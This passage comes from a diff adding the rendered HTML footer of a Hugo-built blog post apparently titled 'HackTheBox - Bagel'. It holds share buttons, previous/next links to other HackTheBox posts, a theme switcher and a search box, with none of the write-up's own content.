2.8c-2.4-14.8-7.3-26.6-14.6-35.2c-10-11.7-25.6-17.7-46.2-17.8H227c-16.6 0-39 4.6-53.3 26.3l-34.4-23.6c19.2-29.1 50.3-45.1 87.8-45.1h.8c62.6 .4 99.9 39.5 103.7 107.7l-.2 .2zm-156 68.8c1.3 25.1 28.4 36.8 54.6 35.3c25.6-1.4 54.6-11.4 59.5-73.2c-13.2-2.9-27.8-4.4-43.4-4.4c-4.8 0-9.6 .1-14.4 .4c-42.9 2.4-57.2 23.2-56.2 41.8l-.1 .1z"/></svg>
+</span></a
+        >
+      
+    
+      
+        <a
+          class="m-1 inline-block min-w-[2.4rem] rounded bg-neutral-300 p-1 text-center text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+          href="https://telegram.me/share/url?text=//localhost:1313/posts/bagel-htb/&amp;url=HackTheBox%20-%20Bagel"
+          title="Share on Telegram"
+          aria-label="Share on Telegram"
+          target="_blank"
+          rel="noopener noreferrer"
+          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M248,8C111.033,8,0,119.033,0,256S111.033,504,248,504,496,392.967,496,256,384.967,8,248,8ZM362.952,176.66c-3.732,39.215-19.881,134.378-28.1,178.3-3.476,18.584-10.322,24.816-16.948,25.425-14.4,1.326-25.338-9.517-39.287-18.661-21.827-14.308-34.158-23.215-55.346-37.177-24.485-16.135-8.612-25,5.342-39.5,3.652-3.793,67.107-61.51,68.335-66.746.153-.655.3-3.1-1.154-4.384s-3.59-.849-5.135-.5q-3.283.746-104.608,69.142-14.845,10.194-26.894,9.934c-8.855-.191-25.888-5.006-38.551-9.123-15.531-5.048-27.875-7.717-26.8-16.291q.84-6.7,18.45-13.7,108.446-47.248,144.628-62.3c68.872-28.647,83.183-33.623,92.511-33.789,2.052-.034,6.639.474,9.61,2.885a10.452,10.452,0,0,1,3.53,6.716A43.765,43.765,0,0,1,362.952,176.66Z"/></svg>
+</span></a
+        >
+      
+    
+  </section>
+
+
+      
+  
+    
+    
+    
+    <div class="pt-8">
+      <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
+      <div class="flex justify-between pt-3">
+        <span>
+          
+            <a class="group flex" href="/posts/precious-htb/">
+              <span
+                class="me-2 text-neutral-700 transition-transform group-hover:-translate-x-[2px] group-hover:text-primary-600 dark:text-neutral dark:group-hover:text-primary-400"
+                ><span class="ltr:inline rtl:hidden">&larr;</span
+                ><span class="ltr:hidden rtl:inline">&rarr;</span></span
+              >
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >HackTheBox - Precious</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2023-05-20 00:00:00 &#43;0000 UTC">20 May 2023</time>
+                  
+                </span>
+              </span>
+            </a>
+          
+        </span>
+        <span>
+          
+            <a class="group flex text-right" href="/posts/soccer-htb/">
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >HackTheBox - Soccer</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2023-06-10 00:00:00 &#43;0000 UTC">10 June 2023</time>
+                  
+                </span>
+              </span>
+              <span
+                class="ms-2 text-neutral-700 transition-transform group-hover:-translate-x-[-2px] group-hover:text-primary-600 dark:text-neutral dark:group-hover:text-primary-400"
+                ><span class="ltr:inline rtl:hidden">&rarr;</span
+                ><span class="ltr:hidden rtl:inline">&larr;</span></span
+              >
+            </a>
+          
+        </span>
+      </div>
+    </div>
+  
+
+
+      
+    </footer>
+  </article>
+
+        
+          <div class="pointer-events-none absolute bottom-0 end-0 top-[100vh] w-12">
+            <a
+              href="#the-top"
+              class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 backdrop-blur hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+              aria-label="Scroll to top"
+              title="Scroll to top"
+            >
+              &uarr;
+            </a>
+          </div>
+        
+      </main><footer class="py-10 print:hidden">
+  
+  
+    <nav class="pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400">
+      <ul class="flex list-none flex-col sm:flex-row">
+        
+          
+          <li class="group mb-1 text-end sm:mb-0 sm:me-7 sm:last:me-0">
+            
+              <a
+                href="/tags/"
+                title=""
+                
+                ><span
+                    class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                    >Tags</span
+                  >
+                </a
+              >
+            
+          </li>
+        
+      </ul>
+    </nav>
+  
+  <div class="flex items-center justify-between">
+    <div>
+      
+      
+        <p class="text-sm text-neutral-500 dark:text-neutral-400">
+            Copy, <em>right?</em> 🤔
+        </p>
+      
+      
+      
+        <p class="text-xs text-neutral-500 dark:text-neutral-400">
+          
+          
+          Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+            href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href="https://github.com/jpanther/congo" target="_blank" rel="noopener noreferrer">Congo</a>
+        </p>
+      
+    </div>
+    <div class="flex flex-row items-center">
+      
+      
+      
+      
+        <div
+          class="me-14 cursor-pointer text-sm text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+        >
+          <button id="appearance-switcher-0" type="button" aria-label="appearance switcher">
+            <div
+              class="flex h-12 w-12 items-center justify-center dark:hidden"
+              title="Switch to dark appearance"
+            >
+              <span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+</span>
+            </div>
+            <div
+              class="hidden h-12 w-12 items-center justify-center dark:flex"
+              title="Switch to light appearance"
+            >
+              <span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+</span>
+            </div>
+          </button>
+        </div>
+      
+    </div>
+  </div>
+  
+  
+</footer>
+<div
+  id="search-wrapper"
+  class="invisible fixed inset-0 z-50 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh]"
+  data-url="//localhost:1313/"
+>
+  <div
+    id="search-modal"
+    class="top-20 mx-auto flex min-h-0 w-full max-w-3xl flex-col rounded-md border border-neutral-200 bg-neutral shadow-lg dark:border-neutral-700 dark:bg-neutral-800"
+  >
+    <header class="relative z-10 flex flex-none items-center justify-between px-2">
+      <form class="flex min-w-0 flex-auto items-center">
+        <div class="flex h-8 w-8 items-center justify-center text-neutral-400">
+          <span class="icon relative inline-block px-1 align-text-bottom"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span>
+        </div>
+        <input
+          type="search"
+          id="search-query"
+          class="mx-1 flex h-12 flex-auto appearance-none bg-transparent focus:outline-dotted focus:outline-2 focus:outline-transparent"
+          placeholder="Search"
+          tabindex="0"
+        />
+      </form>
+      <button
+        id="close-search-button"
+        class="flex h-8 w-8 items-center justify-center text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+        title="Close (Esc)"
+      >
+        <span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+</span>
+      </button>
+    </header>
+    <section class="flex-auto overflow-auto px-2">
+      <ul id="search-results">
+        
+      </ul>
+    </section>
+  </div>
+</div>
+
+    </div>
+  </body>
+</html>
